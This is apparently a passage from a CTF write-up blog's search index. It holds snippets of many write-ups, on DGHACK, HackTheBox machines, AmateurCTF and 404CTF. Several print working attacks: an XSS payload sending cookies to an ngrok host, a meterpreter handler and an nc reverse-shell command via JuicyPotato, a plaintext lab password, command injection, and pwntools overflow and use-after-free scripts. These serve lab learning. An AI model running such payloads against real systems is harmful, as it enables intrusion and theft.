Konami Code and then pressed B followed by A:After a bit of waiting, I finally see the Yeti:I go to speak with him and I get the QR Code:The final URL is https://tryhackme.com/room/armageddon2rThird QR CodeOn the 12th day, we can see this at the bottom of the page:We finish the task and get a vansprinkles session using the Pass The Hash (PtH) technique:We see that there is something that looks like a website, we download everything using the download function in evil-winrm:With our Python server on port 8000 we can look at the webpage chatlog.html:It looks like a save of a chat. As we can see, there is a message that has been deleted and then the original message was sent but cropped with the information we, I believe, need:So I recovered the cropped image called Screenshot 2023-11-22 034941.png. I know from this CTF that we can recover the content of a cropped image. So I use Acropalypse-Multi-Tool: If you want a better understanding of why this works, I advise you to check my WU on the 404 CTFWe first need to know the original size. This can be done by looking at the first screenshot of the desktop:Now we know that the image is 2560 x 1080, so I ran the tool on my image and found the QR Code:The final image is :The final URL is https://tryhackme.com/jr/busyvimfrosteauYou can see the write up of this challenge hereFourth QR CodeAt the end of the 20th day we can see:So we get a look at the GitLab. What I was looking for is a previous commit with the QR Code.We connect with the given credentials and we go to the project page:Now we go into the Commit submenu of the Project menu:As we can see in the commit list, Delf Lead has done a lot of normal commits and then Frostlino came in:Let’s have a look at the GitLab commit called Updating to this years calendaQR! Meow Meow just before the commit of Frostlino:We get the QR Code:The final URL is https://tryhackme.com/jr/surfingyetiiscomingtotownYou can see the write up of this challenge here" }, { "title": "CTFs | DGHACK_2023 | Web | Plugin Again", "url": "/CTFs/DGHACK_2023/Web/Plugin_Again", "categories": "CTFs, DGHACK_2023, Web", "tags": "Web, LFI, XSS", "date": "2023-11-30 00:00:00 +0100", "snippet": "Plugin AgainAs written in the description of the challenge, we need to read the content of the /FLAG file. We only have access to a URL so we can navigate to the website and we get this:First thing I notice was that there is a menu to see which user is connected:Now that we know that Johnny and admin are connected, the first thing that came to my mind was XSS. If we can run XSS on the website, we can recover both session cookies and so, get authenticated. But if we try some basic XSS, we don’t get any result. This is due to the CSP located in the meta tag of the HTML:This header tells us that we can’t run JavaScript code except from the domain cdn.jsdelivr.net. This may not allow us to get our XSS, but after a bit of digging, I found this. Here we see that we can run JavaScript code like the well-known alert(1). It is recommended to run alert(document.domain) or alert(window.origin) to see if we are executing the script from the current webpage or from a sandbox. More explanation in the LiveOverflow video here.So now we can try a basic XSS like this one:And we get the following result:As we can see, the domain is the same as our URL. We can now perform an XSS to recover a cookie. I used this really basic payload :&lt;script src=\"https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js\"&gt;&lt;/script&gt;&lt;script src=\"https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js\"&gt;&lt;/script&gt;&lt;br csp=\"fetch('https://4542-195-221-38-254.ngrok-free.app?COOKIE='+document.cookie)\"&gt; Don’t forget to launch a python (python3 -m http.server) server with an ngrok (ngrok http 8000) to be able to recover the cookie.After a few seconds, we get this result:We can create a cookie named session and set the value to the one we just got. Now we are connected as Johnny:After a while, I couldn’t get any other cookie than the one from Johnny… The admin doesn’t seem to look often the blog posts… After reading the posts on the blog, we can see a message from the admin talking about sending messages to other users. And now if we look at the connected users, we get a new option, we can contact them:But when I send the cookie grabber payload (the one from earlier), I can’t interact with the admin options because I am not on the local machine:So we need to find a way to ask the admin to do the work for us… If we look at the post, we find this interesting one:We then go on GitHub and search for this JhonnyTemplater and we find this code. We notice that there is a possible LFI here:We now reaaaaalllly want to enable this plugin. As Johnny, we can go to the plugin menu and see that the activate button redirects to /activate-plugin/1:I tried to redirect the admin using document.location or window.open but without any result… I then found online some people that send a form to another user and use JavaScript to automatically complete it. So I used the following payload:&lt;iframe style=\"display:none\" name=\"csrf-frame\"&gt;&lt;/iframe&gt;&lt;form id=\"csrf-form\" action=\"/activate-plugin/1\" method=\"GET\"&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt;&lt;/form&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js\"&gt;&lt;/script&gt;&lt;script src=\"https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js\"&gt;&lt;/script&gt;&lt;br csp=\"document.getElementById('csrf-form').submit()\"&gt;This will basically just send a form with just a submit button to the admin user and when he opens the message it will automatically redirect him to /activate/1 which will activate the plugin. I first used action=http://website-ybnx6z.inst.malicecyber.com/activate-plugin/1. This worked when I sent the message to myself (Johnny) but not to the admin.We can now see that we have activated the plugin because we can deactivate it now:Now, we can create a post with a template:If we intercept the request with BurpSuite when we click on Use template, we can see this:We can now replace the theme=funny by theme=../../../../../../../FLAG and now…So the flag is DGHACK{WellD0ne!Bl0ggingIsS0metimeRisky}. We could have tried to get RCE. Indeed, the server is using Flask and the Werkzeug console (more info here). We could have recovered the information in the different files on the server to find the PIN and get RCE in the Werkzeug console." }, { "title": "CTFs | DGHACK_2023 | Crypto | Cryptoneat", "url": "/CTFs/DGHACK_2023/Crypto/Cryptoneat", "categories": "CTFs, DGHACK_2023, Crypto", "tags": "Crypto, AES, CTR, IV, Padding", "date": "2023-11-30 00:00:00 +0100", "snippet": "CryptoneatIn this challenge, we have access to an HTML page that you can download here. In this page, we can see some kind of imported JS code from Crypto JS 3.1.9-1. After this big JS code, we can see another JS code more readable with functions to encrypt and decrypt messages using a password. When we get a quick look at the encrypt function, we can see that the function uses AES on the CTR mode and using padding (keep that in mind it will be useful later):After those function declarations, we can see a big encrypted_message1 and a smaller one called encryptedMsg2. Looking more in detail what vulnerabilities may be exploited for this kind of AES (CTR mode), we find this blog. It tells us that cipher_text = message XOR key. It also tells us that if two messages have the same IV (initialise vector) and the same secret we could recover the content of a cipher text by just knowing one message and its plain text. Here we don’t seem to have a clear text but if we look closer to what we have, we can see that the length of the encryptedMsg2 and of the cryptoThanks are the relatively same:The length difference is due to the padding we saw earlier. Let’s take P1 (respectively P2) as plaintext1 (respectively plaintext2) and C1 (respectively C2) as cipher_text1 (respectively cipher_text2). So, because we know that C1 = P1 XOR KEY and C2 = P2 XOR KEY if we can find the KEY, we could recover the content of P1 and P2. As we just said, we are assuming that P2 = \"Build with love, kitties and flowers\" and that C2_known = \"C19FW3jqqqxd6G/z0fcpnOSIBsUSvD+jZ7E9/VkscwDMrdk9i9efIvJw1Fj6Fs0R\" Note that we removed the IV (first 32 characters each time). The IV isn’t part of the ciphered text it is concatenated to it.With that in mind, we need to add the padding to P2 to get the same length as the C2 one. The length difference is 48-36 = 12 and 12 in hexadecimal is 0xC: Getting the same length is very important because if we don’t have the same one, the XOR operation won’t work properly.If we now XOR P2 (with the added padding of 0xC 12 times) converted to byte and C2 we get the KEY:We can now use the XOR operation on P1 with the found KEY and we get the plain text: Note that we decoded P1 without its IV.When I run my code, I get the content of P1 in a file called p1.txt:We can now go to the URL given and use the password My2uperPassphras3 to access the secret content and recover the flag:The flag is DGHACK{w3ak_pa22word2_ar3n-t_n3at}. You can find my full code here." }, { "title": "CTFs | HackTheBox | Machines | Timelapse", "url": "/CTFs/HackTheBox/Machines/Timelapse", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Windows, LAPS, john, pfx", "date": "2023-07-26 00:00:00 +0200", "snippet": "TimelapseEnumerationAs always, we run our nmap scan:As we can see, we have SMB protocol available. We can try to access the shares using smbmap: Note that we can see the name timelapse.htb, this is because I added the IP address to the /etc/hosts file.As we can see, we have access to the Shares share. This share contains two folders, Dev and HelpDesk:We have a zip file in the Dev folder and some docx files in the HelpDesk folder:After downloading the files, we can see that the files that were in the HelpDesk folder contain procedures to follow on the LAPS protocol to create an administrator password randomly and read it. Use the --download PATH/TO/FILE to download a file using smbmap.PFX Password CrackingWhat is interesting, is that the zip file is protected by a password. We can use zip2john to get the hash and finally john to recover the password:We just have to provide the newly found password, and we get the pfx file from the zip: PFX files (Personal Information Exchange) are a type of digital certificate file that contains both the public key and private key, often used for secure data encryption and authentication.The pfx file is also protected, we use pfx2john this time and crack again the password. After a few minutes, we cracked it:We now can use it as specified on this website to recover the certificate and RSA key.FootholdNow that we have the certificate and the private key, we can connect to the server using evil-winrm with SSL: Don’t forget the -S. If you do so, you will get an error saying that you need to specify a user.User.txtHorizontal Privilege EscalationWhen we get the shell using evil-winrm, we don’t seem to have that many rights…After a bit of roaming on the server, I didn’t find much… But when I tried to get the powershell history at C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt, we find some credentials for the user svc_deploy:Vertical Privilege EscalationNow that we have credentials, we can connect using those via evil-winrm as svc_deploy.As we can see, we have pretty much the same rights, but we are in the LAPS_Readers groups. This means that we could read the Administrator password that was generated randomly.There are a lot of technics to get this password: We can use crackmapexec like crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost 10.10.11.152 -M laps. But this didn’t work. We can use other powershell tools specified on hacktricks or on viperone’s blog. None of the above worked for me, so I search a command to dump password using LAPS and found this Get-ADComputer -Filter 'ObjectClass -eq \"computer\"' -Property *. I added select-object \"ms-Mcs-AdmPwd\" at the end so I only get the password: Finally, I found this python script that dumped the password too:Root.txtNow that we have the Administrator password, we can connect using evil-winrm as before. And… Voilà:" }, { "title": "CTFs | HackTheBox | Machines | Devel", "url": "/CTFs/HackTheBox/Machines/Devel", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Windows, JuicyPotato", "date": "2023-07-20 00:00:00 +0200", "snippet": "DevelEnumerationFirst of all, lets start a basic nmap scan:As we can see, we y have port 21 and port 80 opened. We also can notice that the port 21 (FTP) is accessible by the anonymous user. We can connect and list the files on the FTP server:As we can see, there is what seems to be the tree structure of the web server. When we go on the port 80, we can see the welcome.png in the center of the web page:Initial FootholdWe can try to upload a web shell or a reverse shell using the put command on the FTP server. For that, I generated a meterpreter reverse shell using msfvenom:I then uploaded it. Run the following command in the msfconsole to get a listener on port 443:msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost tun0msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run In the upper commands, write what comes after the &gt;. msf5... is the text given by msfconsole when you launch it don’t write it.I then go to the url http://10.10.10.5/config.aspx, and I get a meterpreter session:Now that we have a meterpreter session, we can execute basic commands to be able to understand who we are and what rights we do have:Privilege EscalationAs we can see, we have a lot of rights. The SeImpersonatePrivilege is vulnerable to the JuicyPotato vulnerability (that I explained here). I then uploaded nc.exe and JuicyPotato.exe:But when I tried to run the JuicyPotato command, I got an error saying that it wasn’t the correct format:So I used this version of JuicyPotato that I called JP.exe:Now this should work, so I create a basic nc instance on the port 445 and run the following command:c:\\Users\\Public\\Downloads\\JP.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\Users\\Public\\Downloads\\nc.exe 10.10.14.56 445 -e cmd\" -t * This default command didn’t work, so I tried to execute the same command using the -c option to specify the CLSID. CLSID stands for “Class Identifier” and is a unique identifier used in the Windows operating system to identify COM (Component Object Model) objects and their associated components. I then referred to this page and tried every CLSID to get an NT AUTORITY/SYSTEM command prompt (the correct one is the second one {03ca98d6-ff5d-49b8-abc6-03dd84127020}): Note that we selected Windows 7 Enterprise from this page first to have a correct list of CLSIDs. If it wasn’t a Windows 7 Enterprise machine, we should have selected another list of CLSIDs.The command worked, and as we can see, we have a cmd as NT AUTORITY/SYSTEM:We can now get both flags, and voilà…" }, { "title": "CTFs | HackTheBox | Machines | Active", "url": "/CTFs/HackTheBox/Machines/Active", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Windows, SMB, LDAP, Kerberos", "date": "2023-07-20 00:00:00 +0200", "snippet": "ActiveEnumerationFirst of all, we can start by running an nmap scan:The nmap scan doesn’t give much clue on what to do now, but there is an SMB share. Let’s have a look:As we can see, we have access to a Replication share. Let’s get its content:As we can see, we have three folders. There is nothing interesting in DfsrPrivate and in scripts, but we can find a Group.xml file in the Policies folder.We can download it locally:We now have a username and a ciphered password. This kind of password is a Group Policy Preferences (GPP) Passwords. We have a command that can get its clear text value:User.txtNow that we have a user, we can try accessing other shares:As we can see, we have now access to the Users share. Let’s have a look:It looks like a classic Windows Users folder. We can try going into the SVC_TGS desktop folder:We get here the user flag:Privilege EscalationWe can now use the script GetUserSPNs.py (of Impacket) to see if we can get any user information:As we can see, there is the Administrator user, we can try recovering its kerberos TGS ticket:We can now try to crack it using Hashcat:Root.txtNow that we have the Administrator credentials, we can connect to the SMB using them to get the files located in the Users share.Now we can go to the desktop of the Administrator and… Voilà. We have the root.txt file that just waits for us to download it:" }, { "title": "CTFs | AmateurCTF2023 | latek", "url": "/CTFs/AmateurCTF2023/latek", "categories": "CTFs, AmateurCTF2023, latek", "tags": "CTF, AmateurCTF2023, latek", "date": "2023-07-19 00:00:00 +0200", "snippet": "LatekI haven’t tried much in this CTF, so this is the only WU that I will write. For this challenge, we need to recover the /flag.txt file.As we can see, we have access to a website that print what is written in the latex input on the left:I tried some basic injections (found on PayloadAllTheThings like /input(/flag.txt), but this didn’t work as expected. After a bit of research, I found this StackExchange post. I then used the following payload:\\documentclass{article}\\usepackage[dvipsnames]{xcolor}\\usepackage{fancyvrb}% redefine \\VerbatimInput\\RecustomVerbatimCommand{\\VerbatimInput}{VerbatimInput}%{fontsize=\\footnotesize, % frame=lines, % top and bottom rule only framesep=2em, % separation between frame and text rulecolor=\\color{Gray}, % label=\\fbox{\\color{Black}data.txt}, labelposition=topline, % commandchars=\\|\\(\\), % escape character and argument delimiters for % commands within the verbatim commentchar=* % comment character}\\begin{document}\\VerbatimInput{/flag.txt}\\end{document}And this gave me the flag: amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}:" }, { "title": "CTFs | 404CTF_2023 | Reverse | Le Divin Crackme", "url": "/CTFs/404CTF_2023/Reverse/Le_Divin_Crackme", "categories": "CTFs, 404CTF_2023, Reverse", "tags": "Reverse, Ghidra", "date": "2023-06-09 00:00:00 +0200", "snippet": "Le Divin CrackmeIn this challenge, we are given this executable.We can guess the password L4_pH1l0soPh13_d4N5_l3_Cr4cKm3. This is because the password is stored in the memory and the use of strncmp will allow the program to get the password split in 3 blocks of 10 characters. The variables are initialized in the following order local_48, acStack_3e, acStack_34. So they will follow each other in the memory. So when we do our first strncmp, we get the 10 characters in the position of acStack_3e. acStack_3e is in the second position, so we get from the 11th character to the 21st. Same for local_48 and the first 10 characters and acStack_34 and the last 10 characters..The flag needs also to contain the compiler used to get this executable. It was gcc, this could be found in the .comment section of the executable:The final flag is then 404CTF{gcc:strncmp:L4_pH1l0soPh13_d4N5_l3_Cr4cKm3}" }, { "title": "CTFs | 404CTF_2023 | Reverse | L’inspiration en images", "url": "/CTFs/404CTF_2023/Reverse/L_inspiration_en_images", "categories": "CTFs, 404CTF_2023, Reverse", "tags": "Reverse, Ghidra, OpenGL", "date": "2023-06-09 00:00:00 +0200", "snippet": "L’inspiration en imagesIn this challenge, we are given this executable. We need to recover the RGBA float values of the painting. But when we look at the paining, either by extracting the image using binwalk or running the program, we see only a black background:So I started looking at the code for something referring to the color and found that:This is the only function that contains the word color. So I looked at this function and found that the glad_glClearColor function is part of the OpenGL library and is used to specify the clear color for the color buffer. When you render graphics using OpenGL, the color buffer holds the pixel data for the current frame being displayed. The glClearColor function sets the color value that will be used to clear the color buffer before rendering the next frame.So I decoded the hexadecimal values 0x3e4ccccd,0x3e99999a,0x3e99999a,0x3f800000 using the online tool Scadacore and found the float values:So the flag is 404CTF{vect4(0.2,0.3,0.3,1.0)}" }, { "title": "CTFs | 404CTF_2023 | Hardware | Un réveil difficile", "url": "/CTFs/404CTF_2023/Hardware/Un_reveil_difficile", "categories": "CTFs, 404CTF_2023, Hardware", "tags": "Hardware, CIRC, Logic Gates", "date": "2023-06-09 00:00:00 +0200", "snippet": "Un réveil difficileIn this challenge, we are given this CIRC file. When we open it with Logisim, we can see the following:As we can see in the challenge statement, we need to print Un_c. So we just modify the input matrix by clicking on the 0s to modify them into 1s:Now that we have Un_c as specified we need to use CTRL+T to tick the clock and get the message printed out:We need to do that several times until we get back to Un_c:Now we have everything we need to assemble the flag. As specified in the challenge statement, if we don’t know what character is printed, we need to choose in this order number, lower case, and finally upper case.So with all that said, the flag is 404CTF{Un_cH1FFrA9e_A55e2_bi3n_d3PreCie}" }, { "title": "CTFs | 404CTF_2023 | Hardware | Un courrier suspect", "url": "/CTFs/404CTF_2023/Hardware/Un_courrier_suspect", "categories": "CTFs, 404CTF_2023, Hardware", "tags": "Hardware, CIRC, Logic Gates", "date": "2023-06-09 00:00:00 +0200", "snippet": "Un courrier suspectIn this challenge, we are given this CIRC file. By looking on the internet, I found that the tool Logisim could open such files. When we open the file we get this:So we go to the first part and now we have the first part of the flag 404CTF{L3_:We now go to the second section:The second and third sections are linked, so we look at what we have in the third section:We need to fill the matrix with the entry of the Multiplexer of the part 2 by order of their arrival in the multiplexer. Here is an example of the first four:So the final hexadecimal values we need to set in the matrix are 4d 30 6d 33 6e 54 5f 33 53 74 5f 56 33 6e 55 33. We can now spam the CTRL+T to tick several times, and the text field completes itself:We now have the second part of the flag M0m3nT_3St_V3nU_.We now go to the 4th part:As we can see, it’s like in the second part, so in the black box of the part 4 i just re-created the part 3 and set the input in the same way we did earlier. This time the hexadecimal string is 44 33 5f 35 34 6d 75 73 33 72 7d:As we did previously, we tick the clock with CTRL+T and we get the last part of the flag:The last part of the flag is _D3_54mus3r}.The final flag is 404CTF{L3_M0m3nT_3St_V3nU_D3_54mus3r}" }, { "title": "CTFs | 404CTF_2023 | Pwn | Un tour de magie", "url": "/CTFs/404CTF_2023/Pwn/Un_tour_de_magie", "categories": "CTFs, 404CTF_2023, Pwn", "tags": "Pwn, Stack, Heap", "date": "2023-06-08 00:00:00 +0200", "snippet": "Un tour de magieIn this challenge, we are given this zip file containing the source code and the compiled code.The compiled code is a WASM file. WASM stands for WebAssembly, which is a binary instruction format designed for the web. WebAssembly is a low-level virtual machine that is designed to run efficiently on web browsers and provides a portable execution environment for web applications. It allows developers to write code in languages such as C, C++, and Rust and compile them into WebAssembly, which can then be executed in a web browser alongside JavaScript.How to exploitAs we can see in the main source code, we have an input variable that is of length 20, but then the fgets take an input of 200… There should be a possibility of buffer overflow here…We can first try to run with 21 As, but we get the following error:This is because we didn’t change the value of check:We can try to add more characters, and when we get to 23, we get the result:Which comes from:Create our payloadNow that we managed to modify the address of check, we need to modify it to 0x50bada55 to be able to get the flag. So let’s try to put 19 As and 4 Bs where the Bs are representing the address of check that we need to override:As we can see, we don’t have all the Bs (42) at the end. So let’s put 18 As, 4 Bs and 1 C:As we can see, we have two Bs instead of one. We do the same thing until we get to 16 As, 4 B and 3 Cs:And now we have all the Bs. We can now use the following code to do the same thing but automatically and send the payload to the netcat server!from pwn import *# Establish the connection to the vulnerable C program#io = process(['./wasmtime', 'main.wasm'])io = remote(\"challenges.404ctf.fr\", 30274)# Craft the payload to set *check to 0x50bada55payload = b'A' * 16 + p32(0x50bada55) + b\"C\" *3print(io.recvline())# Send the payload to the programio.sendline(payload)# Receive and print the program's outputoutput = io.recvline()print(output)if (b\"Apparemment non\" not in output):\toutput = io.recvall()\tprint(\"Flag :\", output.decode())# Close the connectionio.close()We get the following result:The flag is 404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}" }, { "title": "CTFs | 404CTF_2023 | Pwn | La Cohue", "url": "/CTFs/404CTF_2023/Pwn/La_Cohue", "categories": "CTFs, 404CTF_2023, Pwn", "tags": "Pwn, Ghidra, Canary", "date": "2023-06-08 00:00:00 +0200", "snippet": "La CohueIn this challenge, we are given an ELF executable available here. If we look at the code in Ghidra, we can see a canary function that prints the flag. The executable allows us to discuss with Francis that lost his canary. With all of this canaries, we can guess that this challenge want us to do a buffer overflow and bypass the canary.Format stringAs we can see in the code, there is the gets function that will print our input. gets function in C is vulnerable to format string attacks. The gets function is used to read a line of input from the standard input and store it into a buffer. However, it does not perform any bounds checking on the input, making it susceptible to buffer overflows and format string vulnerabilities.We can try using a basic payload like %p to see if anything happens:Get the canary addressAs we can see, we have an address displayed. We can continue to do so until we find the address of the canary. The address of the canary is easy to find, it is the only one that finish with some zeros at the end. We can use %i$p where i is an integer. This is used to read the value from a specific position on the stack. Here’s a breakdown of the notation:%i: It specifies the position of the address we will display$p: It indicates that the value to be printed is fetched from the stack at a specific position indicated by the integer value i.So we can do for example %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p:We don’t see anything interesting here. The strings at the end that look like 0x2432252070243125 are just our input. If we decode 0x2432252070243125 to ASCII characters, we get $2% p$1%. We can continue with the values from 11 to 20 and we have:We can see that the address at position %17 is 0xea9dd891cb4be500 wich ends with 00. This may be our address. We can run it a second time to confirm that it is the good one:As we can see, the address changed but still ends with two zeros. This should be the address of our canary. Because there is no ASLR on this program, we can get the address of the canary function using Ghidra or Gdb:Craft our payloadNow, for our payload to work correctely, we need to find the offset value, that can be found in the choice function:Now we have everything we need. We can use the following code to get the flag:from pwn import *warnings.filterwarnings(\"ignore\", category=BytesWarning)#io = process(\"la_cohue\")io = remote(\"challenges.404ctf.fr\", 30223)io.sendline(\"2\")# try with %10$ ... %20$p =&gt; find an address like 0x...00 =&gt; this address is the canary addressio.sendline(\"%17$p \")io.recvuntil(\"[Vous] : \")addr_canary = io.recvline()[:-1].decode()print(\"@ canary:\", addr_canary)#String to hexaddr_canary = int(addr_canary, 16)#convert to address formataddr_canary = p64(addr_canary)aff = io.recvuntil(\"&gt;&gt;&gt; \")#address of the function named Canary (found in Ghidra or objdump -d | grep canary)addr_fct_canary = p64(0x00400877)offset = 72payload = b\"A\" * offset + addr_canary + 8* b\"A\" + addr_fct_canaryio.sendline(\"1\")io.recvuntil(\"[Vous] : \")io.sendline(payload)print(io.recvline().decode())io.recvuntil(\"&gt;&gt;&gt; \").decode()io.sendline(\"3\")print(io.recvline().decode())print(\"Flag : \"+io.recvline().decode())We get the flag 404CTF{135_C4N4r15_41M3N7_14_C0MP46N13_N3_135_141553Z_P45_53U15}" }, { "title": "CTFs | 404CTF_2023 | Pwn | L'Alchimiste", "url": "/CTFs/404CTF_2023/Pwn/L_Alchimiste", "categories": "CTFs, 404CTF_2023, Pwn", "tags": "Pwn, Ghidra, BoF, Use After Free", "date": "2023-06-08 00:00:00 +0200", "snippet": "L’AlchimisteFor this challenge, we are given this executable. We can open it on Ghidra and/or run it to understand how it works.RecognitionAs we can see, we have multiple options. I first tried to buy a strength potion and to use it multiple time:As we can see, we have a double free error. This is because, when we use the strength potion, we call the useItem function that does the following:As we can see, we free the memory at the location of param_1+0x10. If we look at the character creation, we can see that it is the address of the function located after the initial parameter: param1 is the strength, param2 is the intelligence and param3 is the gold.To better understand why this is a function, we can look at the buyStrUpPotion function:Increase StrengthAs we can see, we set puVar1 some values and the last value of puVar1 is the function incStr that increase the strength by 10. We can also notice that the function incStr is set even if we don’t have enough money to buy the strength potion. So we can use repeatedly the option 1 to buy the potion and then use the option with the option 2. This will allow us to get any amount of strength we want:As we can see, we now have 230 of strength. Let’s have a look at how to get the flag… This is what we are here fore XD:How to get the flagAs we cans see, we need *param_1 &gt;= 0x96 and param[1] &gt;= 0x96 where 0x96 is equal to 150 in decimal and those parameters are the strength and the intelligence as we saw earlier. Note that *param &lt;=&gt; param_1[0].We have solved the problem of the strength, but what about the intelligence??? There is no function in the program that calls the incInt to do the same thing as for the strength…Increase IntelligenceAfter a bit of digging, I found something called use after free. As we saw earlier, the memory is free when we call the useItem function, but the memory is not set as null before. This is great, at least for us XD.We now can try to override the address of the function incStr with the address of incInt after the free of the useItem. If we manage to do so, the address of incInt will be at the same memory location than the previous incStr. Then the call of useItem will think that it is calling the incStr but it will be calling incInt.Let’s see how to this now. For that we need to head back to the buyStrPotion. This function will set the address of the incStr function int puVar1[8] but if we look at the assembly code, we can see that it is at the position +0x40.We can then try to override the first 64 (0x40) characters and then put the address of incInt that can be found in Ghidra. But for this to work, we need to call the option 3 that will do a malloc on the same memory location that was previously free with option 2.POCThe final code I used is the following:from pwn import *warnings.filterwarnings(\"ignore\", category=BytesWarning)#io = process(\"./l_alchimiste\")HOST, PORT = \"challenges.404ctf.fr\", 30944 io = remote(HOST, PORT)def getStrength():\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"2\")\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"1\")def checkStrength():\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"4\")\ttext = io.recvuntil(\"1:\")\tprint(text)\tif b\"FOR: 160\" in text:\t\treturn 1\telse:\t\treturn 0def setInteligence():\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"2\")\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"3\")\tio.recvuntil(\"[Vous] : \")\tio.sendline(b\"a\"*0x40+p64(0x004008d5))\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"1\")def checkInteligence():\tio.recvuntil(\"&gt;&gt;&gt; \")\tio.sendline(\"4\")\ttext = io.recvuntil(\"1:\")\tprint(text)\tif b\"INT: 160\" in text:\t\treturn 1\telse:\t\treturn 0io.recvuntil(\"&gt;&gt;&gt; \")io.sendline(\"1\")okStr = 0while okStr != 1:\tgetStrength()\tokStr = checkStrength()okInt = 0 while okInt != 1:\tokInt = checkInteligence()\tsetInteligence()io.recvuntil(\"&gt;&gt;&gt; \")io.sendline(\"5\")print(io.recvline().decode())print(io.recvline().decode())print(\"Flag: \", io.recvline().decode())If we run it locally, we get:As we can see, we get the test flag we created. We can now run it on the remote host and get the flag:The flag is 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}" }, { "title": "CTFs | 404CTF_2023 | Pwn | Je veux la lune !", "url": "/CTFs/404CTF_2023/Pwn/Je_veux_la_lune", "categories": "CTFs, 404CTF_2023, Pwn", "tags": "Pwn, Command Injection, Injection", "date": "2023-06-08 00:00:00 +0200", "snippet": "Je veux la lune !The challenge gives us the following code:#!/bin/bashCaligula=CaiuslistePersonnes=\"Cherea Caesonia Scipion Senectus Lepidus Caligula Caius Drusilla\"echo \"Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?\"read personneeval \"grep -wie ^$personne informations.txt\"while true; do echo \"De qui d'autre tu veux que je te parle ?\" read personne if [ -n $personne ] &amp;&amp; [ $personne = \"stop\" ] ; then exit fi bob=$(grep -wie ^$personne informations.txt) if [ -z \"$bob\" ]; then echo \"Je n'ai pas compris de qui tu parlais. Dis-moi stop si tu veux que je m'arrête, et envoie l'un des noms que j'ai cités si tu veux des informations.\" else echo $bob fi doneAs we can see in the above code, there is no sanitization of the input presonne. So we can just type 404CTF flag.txt;grep -iRl 404CTF /; ls (I used flag.txt but you can use anything you want) and we get: Note that we added ls at the end. This is just so that the final command looks like grep -wie 404CTF flag.txt;grep -iRl 404CTF /; ls informations.txt Now we can run the command 404CTF flag.txt;cat /proc/self/task/3/cwd/lune.txt; ls to get the flag:The flag is 404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}" }, { "title": "CTFs | 404CTF_2023 | Stega | Odobenus Rosmarus", "url": "/CTFs/404CTF_2023/Stega/Odobenus_Rosmarus", "categories": "CTFs, 404CTF_2023, Stega", "tags": "Stega, Morse", "date": "2023-06-07 00:00:00 +0200", "snippet": "Odobenus RosmarusIn this challenge, the name was a hint:We now know that it is something in morse code, but what…. That is the question that I asked myself during long ours of thinking… Then I explained to my dad the problem I was facing, and by explaining that, in morse code, we have . that stand for short (Court in French), - that stand for long (Long in French) and spaces (Espace in French). By saying that… I just understood the challenge. We only have capital C, L and E for Court, Long and Espace. I then used the following program to decode the text:MORSE_CODE_DICT = { 'A':'.-', 'B':'-...', 'C':'-.-.', 'D':'-..', 'E':'.', 'F':'..-.', 'G':'--.', 'H':'....', 'I':'..', 'J':'.---', 'K':'-.-', 'L':'.-..', 'M':'--', 'N':'-.', 'O':'---', 'P':'.--.', 'Q':'--.-', 'R':'.-.', 'S':'...', 'T':'-', 'U':'..-', 'V':'...-', 'W':'.--', 'X':'-..-', 'Y':'-.--', 'Z':'--..', '1':'.----', '2':'..---', '3':'...--', '4':'....-', '5':'.....', '6':'-....', '7':'--...', '8':'---..', '9':'----.', '0':'-----', ', ':'--..--', '.':'.-.-.-', '?':'..--..', '/':'-..-.', '-':'-....-', '(':'-.--.', ')':'-.--.-'}def decrypt(message): # extra space added at the end to access the # last morse code message += ' ' decipher = '' citext = '' for letter in message: # checks for space if (letter != ' '): # counter to keep track of space i = 0 # storing morse code of a single character citext += letter # in case of space else: # if i = 1 that indicates a new character i += 1 # if i = 2 that indicates a new word if i == 2 : # adding space to separate words decipher += ' ' else: # accessing the keys using their values (reverse of encryption) decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT .values()).index(citext)] citext = '' return deciphertext = \"Ce soir je Célèbre Le Concert Electro Comme Louis Et Lou. Comme La nuit Commence Et Continue Clairement, Et Clignote Lascivement il Chasse sans Chausser En Clapant Encore Classiquement Les Cerclages du Clergé. Encore Car Encore, Louis Lou Entamant Longuement La Lullabile En Commençant Le Cercle Exhaltant de Club Comique Cannais Et Clermontois.\"morse = \"\"for mot in text:\tif mot[0] == \"L\":\t\tmorse += \"-\"\telif mot[0] == \"E\":\t\tmorse += \" \"\telif mot[0] == \"C\":\t\tmorse += \".\"print()print(\"Morse :\", 